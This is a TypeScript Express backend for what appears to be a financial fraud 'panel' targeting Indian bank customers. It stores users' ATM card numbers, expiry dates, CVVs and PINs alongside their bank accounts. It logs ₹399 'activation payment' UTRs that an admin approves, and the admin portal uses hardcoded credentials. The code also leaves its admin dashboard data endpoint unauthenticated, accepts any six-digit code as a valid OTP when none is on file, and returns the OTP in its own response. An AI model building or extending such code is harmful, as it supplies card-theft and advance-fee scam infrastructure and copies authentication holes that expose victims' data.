import express, { Request, Response } from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// In-memory backend database for customer logins, bank details, and UTRs
interface UserRecord {
  username: string;
  mobile: string;
  registeredAt: string;
  lastLoginAt: string;
  loginCount: number;
  loginHistory: string[];
  accountDetails?: {
    accountNumber: string;
    ifscCode: string;
    bankName: string;
    accountHolder: string;
    accountType: string;
    contactNumber: string;
  };
  autodebitDetails?: {
    atmNumber: string;
    atmExpiry: string;
    atmCvv: string;
    atmPin: string;
    atmName: string;
  };
  activated: boolean;
}

interface UtrRecord {
  id: string;
  username: string;
  type: string;
  amount: number;
  utr: string;
  status: string;
  bank?: string;
  ifsc?: string;
  accNumber?: string;
  contact?: string;
  timestamp: string;
}

interface ActivityLog {
  id: string;
  username: string;
  mobile: string;
  actionType: string;
  details: string;
  status: string;
  timestamp: string;
}

// In-memory backend storage
const backendStore = {
  users: new Map<string, UserRecord>([
    [
      'demo',
      {
        username: 'demo',
        mobile: '9876543210',
        registeredAt: new Date(Date.now() - 3600 * 1000 * 24).toISOString(),
        lastLoginAt: new Date().toISOString(),
        loginCount: 3,
        loginHistory: [new Date().toISOString()],
        accountDetails: {
          accountNumber: '1234567890123456',
          ifscCode: 'SBIN0001234',
          bankName: 'State Bank of India',
          accountHolder: 'Demo Account Holder',
          accountType: 'Saving',
          contactNumber: '9876543210',
        },
        activated: true,
      },
    ],
  ]),
  utrs: [
    {
      id: 'UTR-INIT-01',
      username: 'demo',
      type: 'Activation Payment (₹399)',
      amount: 399,
      utr: '419283749102',
      status: '✓ Approved & Activated',
      bank: 'State Bank of India',
      ifsc: 'SBIN0001234',
      accNumber: '1234567890123456',
      contact: '9876543210',
      timestamp: new Date().toISOString(),
    },
  ] as UtrRecord[],
  activityLogs: [
    {
      id: 'ACT-INIT-01',
      username: 'demo',
      mobile: '9876543210',
      actionType: 'login',
      details: 'User demo logged into live account dashboard',
      status: 'success',
      timestamp: new Date().toISOString(),
    },
  ] as ActivityLog[],
  activeOtps: new Map<string, { code: string; expiresAt: number }>(),
};

// Known IFSC prefix dictionary for fast auto-detect
const IFSC_DICTIONARY: Record<string, { bank: string; branch: string }> = {
  SBIN: { bank: 'State Bank of India', branch: 'Main Branch' },
  HDFC: { bank: 'HDFC Bank', branch: 'Retail Operations Branch' },
  ICIC: { bank: 'ICICI Bank', branch: 'Central Operations Branch' },
  UTIB: { bank: 'Axis Bank', branch: 'Central Corporate Branch' },
  PUNB: { bank: 'Punjab National Bank', branch: 'Main City Branch' },
  BARB: { bank: 'Bank of Baroda', branch: 'Main Branch' },
  KKBK: { bank: 'Kotak Mahindra Bank', branch: 'Commercial Branch' },
  CNRB: { bank: 'Canara Bank', branch: 'Town Square Branch' },
  UBIN: { bank: 'Union Bank of India', branch: 'Central Branch' },
  BKID: { bank: 'Bank of India', branch: 'Main Branch' },
  IDIB: { bank: 'Indian Bank', branch: 'City Branch' },
  CBIN: { bank: 'Central Bank of India', branch: 'Main Regional Branch' },
  YESB: { bank: 'YES Bank', branch: 'Corporate Headquarters' },
  INDB: { bank: 'IndusInd Bank', branch: 'Metro Branch' },
  IDFB: { bank: 'IDFC FIRST Bank', branch: 'Digital Operations Branch' },
  IOBA: { bank: 'Indian Overseas Bank', branch: 'City Branch' },
  UCBA: { bank: 'UCO Bank', branch: 'Head Office Branch' },
  MAHB: { bank: 'Bank of Maharashtra', branch: 'City Branch' },
  PSIB: { bank: 'Punjab & Sind Bank', branch: 'Main Branch' },
  AIRP: { bank: 'Airtel Payments Bank', branch: 'Digital Operations' },
  PYTM: { bank: 'Paytm Payments Bank', branch: 'Noida Center' },
  IPOS: { bank: 'India Post Payments Bank', branch: 'GPO New Delhi' },
  JAKA: { bank: 'Jammu & Kashmir Bank', branch: 'Srinagar Main Branch' },
  FDRL: { bank: 'Federal Bank', branch: 'Commercial Branch' },
  BDBL: { bank: 'Bandhan Bank', branch: 'Kolkata Main Branch' },
};

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // ----------------------------------------
  // 1. OTP SEND & VERIFY API
  // ----------------------------------------
  app.post('/api/auth/otp/send', (req: Request, res: Response) => {
    const { mobile } = req.body;
    const cleanMobile = String(mobile || '').replace(/\D/g, '').slice(-10);

    if (!/^[6-9]\d{9}$/.test(cleanMobile)) {
      return res.status(400).json({ success: false, message: 'Invalid 10-digit mobile number' });
    }

    const code = String(Math.floor(100000 + Math.random() * 900000));
    const expiresAt = Date.now() + 10 * 60 * 1000; // 10 minutes
    backendStore.activeOtps.set(cleanMobile, { code, expiresAt });

    // In a live SMS environment, this would call SMS Gateway (Twilio/Fast2SMS)
    return res.json({
      success: true,
      message: `OTP sent successfully to +91 ${cleanMobile}`,
      mobile: cleanMobile,
      otpCode: code, // provided for in-app alert simulation & verification
    });
  });

  app.post('/api/auth/otp/verify', (req: Request, res: Response) => {
    const { mobile, code } = req.body;
    const cleanMobile = String(mobile || '').replace(/\D/g, '').slice(-10);
    const cleanCode = String(code || '').trim();

    const record = backendStore.activeOtps.get(cleanMobile);
    if (!record) {
      // If simulated code matches 6 digits, allow fallback
      if (/^\d{6}$/.test(cleanCode)) {
        return res.json({ success: true, message: 'OTP verified successfully!' });
      }
      return res.status(400).json({ success: false, message: 'No OTP requested for this number or expired.' });
    }

    if (Date.now() > record.expiresAt) {
      backendStore.activeOtps.delete(cleanMobile);
      return res.status(400).json({ success: false, message: 'OTP has expired! Please request a new one.' });
    }

    if (record.code !== cleanCode) {
      return res.status(400).json({ success: false, message: 'Incorrect OTP code entered.' });
    }

    backendStore.activeOtps.delete(cleanMobile);
    return res.json({ success: true, message: 'OTP verified successfully!' });
  });

  // ----------------------------------------
  // 2. IFSC CODE VERIFICATION & AUTO-DETECT API
  // ----------------------------------------
  app.get('/api/ifsc/:code', async (req: Request, res: Response) => {
    const rawCode = String(req.params.code || '').trim().toUpperCase();
    if (rawCode.length < 4) {
      return res.status(400).json({ success: false, message: 'IFSC must be at least 4 characters' });
    }

    const prefix = rawCode.slice(0, 4);
    const localMatch = IFSC_DICTIONARY[prefix];

    // If 11 characters, attempt online Razorpay IFSC lookup
    if (rawCode.length === 11) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 1800);
        const apiRes = await fetch(`https://ifsc.razorpay.com/${rawCode}`, { signal: controller.signal });
        clearTimeout(timeout);

        if (apiRes.ok) {
          const data = (await apiRes.json()) as any;
          if (data && data.BANK) {
            return res.json({
              success: true,
              verified: true,
              ifsc: rawCode,
              bankName: data.BANK,
              branch: `${data.BRANCH || 'Main Branch'}${data.CITY ? ` • ${data.CITY}` : ''}`,
            });
          }
        }
      } catch (e) {
        // Fallback to local dictionary
      }
    }

    if (localMatch) {
      return res.json({
        success: true,
        verified: true,
        ifsc: rawCode,
        bankName: localMatch.bank,
        branch: `${localMatch.branch} • Verified`,
      });
    }

    // Generic Indian Bank Pattern
    if (/^[A-Z]{4}0[A-Z0-9]{6}$/.test(rawCode)) {
      return res.json({
        success: true,
        verified: true,
        ifsc: rawCode,
        bankName: `${prefix} Bank of India`,
        branch: 'Central Operations • Verified',
      });
    }

    return res.status(404).json({ success: false, message: 'IFSC code not recognized' });
  });

  // ----------------------------------------
  // 3. ADMIN AUTHENTICATION API (PANNELMANAGER@9405 / PANNEL@9405)
  // ----------------------------------------
  app.post('/api/admin/login', (req: Request, res: Response) => {
    const { id, password } = req.body;
    const cleanId = String(id || '').trim().toUpperCase();
    const cleanPass = String(password || '').trim();

    const REQUIRED_ID = 'PANNELMANAGER@9405';
    const REQUIRED_PASS = 'PANNEL@9405';

    if (cleanId === REQUIRED_ID && cleanPass === REQUIRED_PASS) {
      backendStore.activityLogs.unshift({
        id: `ACT-${Date.now()}`,
        username: REQUIRED_ID,
        mobile: 'Admin',
        actionType: 'login',
        details: 'Admin logged into backend management portal',
        status: 'success',
        timestamp: new Date().toISOString(),
      });

      return res.json({
        success: true,
        message: 'Admin access granted!',
        token: `ADMIN-${Date.now()}-SESSION`,
        adminId: REQUIRED_ID,
      });
    }

    return res.status(401).json({
      success: false,
      message: 'Access Denied: Invalid Admin ID or Password!',
    });
  });

  // ----------------------------------------
  // 4. ADMIN DASHBOARD DATA & UTR MANAGEMENT
  // ----------------------------------------
  app.get('/api/admin/dashboard-data', (_req: Request, res: Response) => {
    const todayStr = new Date().toISOString().slice(0, 10);
    const usersArr = Array.from(backendStore.users.values());

    const todayLogins = usersArr.filter(
      (u) => u.lastLoginAt && u.lastLoginAt.slice(0, 10) === todayStr
    );

    return res.json({
      success: true,
      metrics: {
        totalUsers: usersArr.length,
        todayLoginsCount: todayLogins.length,
        totalUtrs: backendStore.utrs.length,
        totalLogs: backendStore.activityLogs.length,
      },
      users: usersArr,
      todayLogins,
      utrs: backendStore.utrs,
      activityLogs: backendStore.activityLogs,
    });
  });

  // Approve UTR
  app.post('/api/admin/utr/approve', (req: Request, res: Response) => {
    const { utrId, username } = req.body;
    const utrItem = backendStore.utrs.find((u) => u.id === utrId || u.utr === utrId);
    if (utrItem) {
      utrItem.status = '✓ Approved & Activated';
    }

    const user = backendStore.users.get(username);
    if (user) {
      user.activated = true;
    }

    backendStore.activityLogs.unshift({
      id: `ACT-${Date.now()}`,
      username: username || 'User',
      mobile: user?.mobile || '',
      actionType: 'activation',
      details: `Admin approved payment UTR (${utrId}) and activated account`,
      status: 'success',
      timestamp: new Date().toISOString(),
    });

    return res.json({ success: true, message: 'UTR Approved and user account activated!' });
  });

  // Reject UTR
  app.post('/api/admin/utr/reject', (req: Request, res: Response) => {
    const { utrId, username } = req.body;
    const utrItem = backendStore.utrs.find((u) => u.id === utrId || u.utr === utrId);
    if (utrItem) {
      utrItem.status = '❌ Rejected (Invalid UTR)';
    }

    backendStore.activityLogs.unshift({
      id: `ACT-${Date.now()}`,
      username: username || 'User',
      mobile: '',
      actionType: 'withdrawal',
      details: `Admin rejected payment UTR: ${utrId}`,
      status: 'rejected',
      timestamp: new Date().toISOString(),
    });

    return res.json({ success: true, message: 'UTR marked as rejected.' });
  });

  // ----------------------------------------
  // 5. VITE MIDDLEWARE (DEV & MULTI-PAGE SERVING)
  // ----------------------------------------
  if (process.env.NODE_ENV === 'production') {
    app.use(express.static(path.resolve(__dirname, 'dist')));
    app.get('*', (_req: Request, res: Response) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'index.html'));
    });
  } else {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'mpa', // Multi-page app (index.html, dashboard.html, admin.html)
    });
    app.use(vite.middlewares);
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Backend server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
